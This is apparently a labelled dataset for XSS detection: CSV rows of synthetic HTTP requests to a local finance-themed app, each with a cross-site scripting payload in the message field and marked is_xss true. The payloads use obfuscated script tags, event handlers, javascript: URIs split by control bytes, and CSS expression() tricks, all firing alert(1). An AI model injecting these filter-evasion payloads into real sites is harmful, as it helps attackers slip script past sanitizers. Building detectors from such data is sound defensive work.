mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"application/json, text/plain, image/png, */*",2350446350012469780,http://127.0.0.1:5000/deposit/6fzz2l4o,192.213.62.225,68739,GET,Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1),"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",true
"text/html, */*",9173527371560642173,http://127.0.0.1:5000/debit/tiypq70q,140.216.216.226,87212,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7","<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",true
"image/png, text/html, */*",8648150458596966692,http://127.0.0.1:5000/capital/mo240m1k,226.25.26.102,56782,GET,Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",true
"application/json, text/html, */*",8393900091837204069,http://127.0.0.1:5000/interest/53llai7z,100.2.38.143,69139,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<object onError object onError=""javascript:javascript:alert(1)""></object onError>",true
"image/jpeg, image/png, */*",545954495006715262,http://127.0.0.1:5000/credit/56xev93a,222.244.147.8,57587,GET,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24","<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",true
"text/html, image/jpeg, */*",1964242674378427299,http://127.0.0.1:5000/stock/fblugixp,248.81.133.93,21453,POST,Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8),"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",true
"text/plain, image/jpeg, application/json, image/png, */*",8838669864373569320,http://127.0.0.1:5000/invest/x51n5fv7,44.104.173.222,23476,POST,"Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221","<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",true
"image/jpeg, */*",7228409902139205104,http://127.0.0.1:5000/account/91o2ev4x,240.150.249.44,81197,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4),"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",true
"text/html, text/plain, image/jpeg, application/json, */*",1076378842822837081,http://127.0.0.1:5000/credit/rdmry5jo,206.252.20.215,27615,POST,Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1) Gecko/20090624 Ubuntu/8.04 (hardy) Firefox/3.5,"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",true
"text/html, image/png, */*",6461170267157037472,http://127.0.0.1:5000/credit/hor7qxkj,252.234.141.126,29029,OPTIONS,Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",true
"image/jpeg, */*",5963905971626653147,http://127.0.0.1:5000/debit/pxg4h31s,83.22.1.210,88157,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412","<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",true
"text/plain, image/png, image/jpeg, text/html, */*",6314788303877277820,http://127.0.0.1:5000/transaction/y0v7nptk,108.77.49.232,96916,POST,"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14","<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",true
"application/json, image/png, */*",9142702992405730967,http://127.0.0.1:5000/invest/83rah5cu,95.147.121.142,42567,DELETE,Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5,"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",true
"application/json, image/jpeg, */*",690274418306305953,http://127.0.0.1:5000/debit/18e0dtvo,218.104.15.105,7310,POST,Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 Chrome/2.0.172.6 Safari/530.7,"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",true
"image/jpeg, */*",168783402812732302,http://127.0.0.1:5000/dividend/np9a40ni,195.211.177.160,81261,GET,Opera/6.04 (Windows NT 4.0; U)  [de],"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",true
"text/html, image/png, */*",3896174773042209747,http://127.0.0.1:5000/portfolio/fl1wgdfm,221.132.3.193,40859,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582","<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",true
"application/json, text/html, text/plain, image/png, */*",3695940219111290847,http://127.0.0.1:5000/market/3808b2w2,82.171.215.186,75242,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.370.0 Safari/533.4","<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",true
"text/plain, application/json, image/jpeg, image/png, */*",6219928671300748264,http://127.0.0.1:5000/interest/yrsy3np8,204.147.123.17,44319,POST,"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2","<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",true
"image/jpeg, text/plain, text/html, application/json, */*",1620430429575966250,http://127.0.0.1:5000/equity/5ed8u38i,231.253.209.152,5463,GET,Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows ME) Opera 7.0  [en],"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",true
"text/html, image/jpeg, application/json, */*",6363286725112884268,http://127.0.0.1:5000/interest/ooqg4iau,129.225.79.167,22,GET,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0),"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",true
"application/json, text/html, image/jpeg, text/plain, */*",3027963048010236545,http://127.0.0.1:5000/credit/yr9zdnt0,105.73.159.53,39264,GET,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt),"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",true
"text/plain, text/html, image/jpeg, */*",142508186068634311,http://127.0.0.1:5000/interest/vycdtpkp,2.234.149.208,89352,GET,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",true
"text/plain, text/html, application/json, image/jpeg, */*",7015098256787052489,http://127.0.0.1:5000/dividend/u0k1je2b,199.10.117.225,48851,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.4 Safari/532.0","<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",true
"text/html, */*",6098997489008868728,http://127.0.0.1:5000/portfolio/pi9f7l93,179.181.121.175,65847,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",true
"application/json, image/png, text/html, text/plain, */*",91461148773457766,http://127.0.0.1:5000/interest/89p615jz,171.113.210.168,54969,POST,"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.551.0 Safari/534.10",\x3Cscript>javascript:alert(1)</script>,true
"text/plain, image/jpeg, text/html, */*",1755241300405695265,http://127.0.0.1:5000/portfolio/8r6dy33f,134.156.193.118,91261,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2","'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",true
"application/json, text/plain, image/png, */*",8935818419913877948,http://127.0.0.1:5000/debit/ud4mif38,198.129.107.182,90449,POST,Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65,<script>javascript:alert(1)</script\x0D,true
"application/json, */*",6417460938988213449,http://127.0.0.1:5000/account/pyqo220w,99.137.167.123,24869,OPTIONS,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/412.7 (KHTML, like Gecko) Safari/412.5",<script>javascript:alert(1)</script\x0A,true
"image/jpeg, */*",1680517166199791237,http://127.0.0.1:5000/stock/3h1p4qbz,252.186.236.75,332,POST,Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC) Opera 8.65 [en],<script>javascript:alert(1)</script\x0B,true
"text/plain, application/json, image/png, text/html, */*",2224680145591545084,http://127.0.0.1:5000/credit/74tft1ko,94.173.175.37,54409,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; da-DK; rv:1.7.7) Gecko/20050414 Firefox/1.0.3,"<script charset=""\x22>javascript:alert(1)</script>",true
"image/jpeg, */*",5351805998401031160,http://127.0.0.1:5000/debit/ig0glfjb,157.104.187.221,44932,POST,Opera/9.01 (Windows NT 5.0; U; de),<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,true
"text/html, application/json, image/png, text/plain, */*",614736863473806762,http://127.0.0.1:5000/capital/2qm3xma9,240.212.218.162,78804,POST,Opera/9.63 (X11; Linux x86_64; U; ru) Presto/2.1.1,--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"image/jpeg, */*",5026751164809383701,http://127.0.0.1:5000/stock/54nx7te7,152.9.56.230,36701,POST,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0),--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"text/plain, */*",2584446363568444097,http://127.0.0.1:5000/credit/ejj1krgm,148.156.31.80,60308,GET,Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"image/jpeg, image/png, text/plain, */*",7185125103741079223,http://127.0.0.1:5000/transaction/cg20a61j,205.115.146.189,11917,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,true
"image/jpeg, */*",6655942139009925299,http://127.0.0.1:5000/loan/3yzhouuk,143.3.229.224,20096,POST,Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0),"`""'><img src='#\x27 onerror=javascript:alert(1)>",true
"image/jpeg, text/plain, text/html, */*",3584633554779728513,http://127.0.0.1:5000/portfolio/eki5d0rm,159.75.41.243,14590,GET,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112),"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"application/json, image/jpeg, */*",4129583554213892943,http://127.0.0.1:5000/credit/suqh2976,212.145.215.178,90934,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",true
"application/json, */*",4240328512807176574,http://127.0.0.1:5000/interest/al3zb97n,59.20.153.49,7508,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.177.1 Safari/530.8","<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/plain, image/png, text/html, application/json, */*",7244939141313937987,http://127.0.0.1:5000/loan/yyur6i0n,49.204.40.74,3502,OPTIONS,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"application/json, image/jpeg, text/html, image/png, */*",1081753310791212693,http://127.0.0.1:5000/transaction/2ljuhujn,252.149.228.221,368,POST,Opera/9.63 (Windows NT 6.0; U; en) Presto/2.1.1,"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/html, image/jpeg, */*",9182258908114992988,http://127.0.0.1:5000/loan/g1o4cokj,225.44.23.199,39595,POST,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11","<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, application/json, text/html, text/plain, */*",3980314761355429489,http://127.0.0.1:5000/invest/zf0iw1c9,87.50.3.187,21204,PUT,Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en],"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, */*",5277416605451583788,http://127.0.0.1:5000/interest/xyd505zh,177.235.12.171,19760,POST,Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0),"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, text/html, */*",3340399356205845800,http://127.0.0.1:5000/interest/r1yoocjs,236.14.253.213,1622,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2","<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/plain, application/json, image/png, */*",5706615706239640716,http://127.0.0.1:5000/loan/82v1nkri,199.181.29.61,71601,POST,Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US),"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/jpeg, text/html, text/plain, image/png, */*",7701669400586010686,http://127.0.0.1:5000/equity/5md2ewul,103.210.220.210,45508,POST,Mozilla/5.0 (Windows; U; Windows NT 6.1; nl; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729),"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"application/json, image/png, text/html, text/plain, */*",700284827135954195,http://127.0.0.1:5000/balance/gegtx5m9,199.204.231.175,65991,POST,Mozilla/2.0 (compatible; MSIE 3.01; Windows 95),"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/html, image/png, text/plain, image/jpeg, */*",1247903768407935409,http://127.0.0.1:5000/capital/9h1ytkfx,160.14.225.34,67056,PUT,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383","<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"text/plain, application/json, */*",1821200626763664648,http://127.0.0.1:5000/transaction/r1v4oe10,254.84.59.32,17121,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16","<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, */*",7921440991625632400,http://127.0.0.1:5000/deposit/ekkqopi8,113.37.44.143,61627,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8","<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, text/html, application/json, image/jpeg, */*",1907298675730048314,http://127.0.0.1:5000/fund/2k51cob1,15.131.189.206,79853,GET,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0),"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",true
"image/png, image/jpeg, application/json, */*",5140085249101792289,http://127.0.0.1:5000/stock/t8ddb1a9,9.207.189.50,22583,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,<script>/* *\x2A/javascript:alert(1)// */</script>,true
"text/html, text/plain, application/json, */*",6256737069914335865,http://127.0.0.1:5000/mortgage/tznvl1ep,193.225.136.60,9983,POST,Mozilla/5.0 (Windows; U; Windows NT 6.0; id; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729),<script>/* *\x00/javascript:alert(1)// */</script>,true
"application/json, image/png, image/jpeg, */*",4939108374634073862,http://127.0.0.1:5000/capital/esrfdz0u,23.33.161.37,16557,GET,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 7.60,"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"application/json, text/html, */*",1261264880512058902,http://127.0.0.1:5000/withdrawal/lawpoo7a,184.225.130.189,37787,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; nl-nl) AppleWebKit/416.11 (KHTML, like Gecko) Safari/312","<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"image/jpeg, application/json, */*",2804652284636110019,http://127.0.0.1:5000/credit/jugbxpvd,165.122.142.243,67668,OPTIONS,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit (KHTML, like Gecko)","<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"text/plain, image/png, text/html, application/json, */*",5409556501079068067,http://127.0.0.1:5000/debit/jf8c9jx4,3.239.76.233,66094,POST,Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50,"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"text/plain, application/json, */*",2934648236090447768,http://127.0.0.1:5000/fund/a8d5v9he,158.234.55.206,61108,GET,"Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1","<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",true
"text/html, image/png, */*",2350865815806917948,http://127.0.0.1:5000/market/cu989qtd,105.17.96.38,28171,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl) AppleWebKit/522.12.1 (KHTML, like Gecko) Version/3.0.1 Safari/522.12.2","""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",true
"application/json, image/jpeg, image/png, */*",6890755749376334803,http://127.0.0.1:5000/interest/p7ceh8wq,118.95.199.190,72413,GET,Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/14.0.1,"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",true
"image/jpeg, text/html, text/plain, */*",5326182504159068531,http://127.0.0.1:5000/market/opf8y0as,2.199.192.249,18906,POST,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",true
"text/html, application/json, image/png, image/jpeg, */*",251881800766479054,http://127.0.0.1:5000/stock/dua2yqnd,138.86.215.6,8466,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; hu-HU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16","<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",true
"image/jpeg, text/plain, image/png, */*",6643989123068665809,http://127.0.0.1:5000/stock/2xgdt19j,63.60.174.129,46,POST,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10","<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",true
"text/html, image/png, image/jpeg, application/json, */*",4478546269552615789,http://127.0.0.1:5000/balance/xbguezk6,176.35.22.155,77874,CONNECT,Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT),"'`""><\x3Cscript>javascript:alert(1)</script>",true
"image/jpeg, image/png, */*",3017163882259068665,http://127.0.0.1:5000/withdrawal/qy7com3r,97.142.64.23,92784,GET,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322),"'`""><\x00script>javascript:alert(1)</script>",true
"image/png, text/html, application/json, */*",8394792488699062221,http://127.0.0.1:5000/portfolio/2mwgy416,40.199.153.173,82787,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; sv) AppleWebKit/522.12.1 (KHTML, like Gecko) Version/3.0.1 Safari/522.12.2","""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",true
"image/png, application/json, text/plain, text/html, */*",5518395448292134304,http://127.0.0.1:5000/debit/dooqj5bi,195.84.186.252,42988,POST,Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16,"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",true
"text/plain, */*",7523841936180169700,http://127.0.0.1:5000/transaction/dixqv9t0,106.240.129.219,24768,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",true
"application/json, */*",4508028401849873535,http://127.0.0.1:5000/capital/aqnhekbz,148.179.95.166,74260,POST,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383","<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",true
"image/png, text/plain, application/json, text/html, */*",5650951976334067825,http://127.0.0.1:5000/account/ojrglaqe,138.136.32.52,69988,GET,Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9,"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",true
"image/png, */*",6850202830352355476,http://127.0.0.1:5000/interest/k43lxrmt,147.127.121.226,8556,POST,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101128 Firefox/4.0b8pre,"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",true
"text/html, */*",3843205112854504031,http://127.0.0.1:5000/portfolio/dx4ou631,145.115.157.170,54666,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705),"<script\x20type=""text/javascript"">javascript:alert(1);</script>",true
"image/jpeg, image/png, text/html, application/json, */*",1918519515495980474,http://127.0.0.1:5000/deposit/h9nmmbt0,112.217.220.157,9706,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13","<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",true
"application/json, text/html, image/jpeg, text/plain, */*",8213702037477752874,http://127.0.0.1:5000/stock/mgoviqdt,114.170.30.218,62564,PUT,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705),"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",true
"image/png, */*",153633270855474816,http://127.0.0.1:5000/account/bo617ikg,201.94.11.196,49741,POST,Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.13) Gecko/20080325 Ubuntu/7.10 (gutsy) Firefox/2.0.0.13,"<script\x09type=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, image/jpeg, application/json, */*",2463328687505721366,http://127.0.0.1:5000/deposit/48ashf4l,164.188.79.216,37023,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; it-it) AppleWebKit/416.12 (KHTML, like Gecko) Safari/416.13","<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, application/json, */*",6201644629760719323,http://127.0.0.1:5000/deposit/2biaavnf,221.249.232.32,13725,POST,Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1),"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",true
"text/html, */*",6522332157442318498,http://127.0.0.1:5000/capital/r4pym5rs,148.50.93.76,15576,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",true
"text/html, image/jpeg, */*",7396729883191446008,http://127.0.0.1:5000/credit/dy7w385n,204.173.164.167,965,GET,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_1; en_GB, en_US) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10","ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",true
"text/plain, application/json, */*",3875516743170746826,http://127.0.0.1:5000/stock/sq0w58u0,85.215.228.198,52123,POST,Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729),"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",true
"image/jpeg, */*",7464629925028809524,http://127.0.0.1:5000/withdrawal/jml2xag0,41.148.30.116,5371,POST,"Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1","ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",true
"image/jpeg, image/png, text/plain, */*",1400241617290164919,http://127.0.0.1:5000/interest/dyegl71w,192.85.182.101,74488,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.15) Gecko/20110303 Ubuntu/10.04 (lucid) Firefox/3.6.15 FirePHP/0.5,"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",true
"text/plain, */*",1100811853312458819,http://127.0.0.1:5000/balance/ornl6ufe,163.211.104.92,73145,POST,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30","ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",true
"image/jpeg, */*",5593435643883170954,http://127.0.0.1:5000/credit/jat94z7z,119.9.108.43,57826,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412.7 (KHTML, like Gecko) Safari/412.5_Adobe","ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",true
"text/plain, image/png, image/jpeg, */*",8267028222519604187,http://127.0.0.1:5000/loan/sx0sbspk,69.27.0.124,46557,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",true
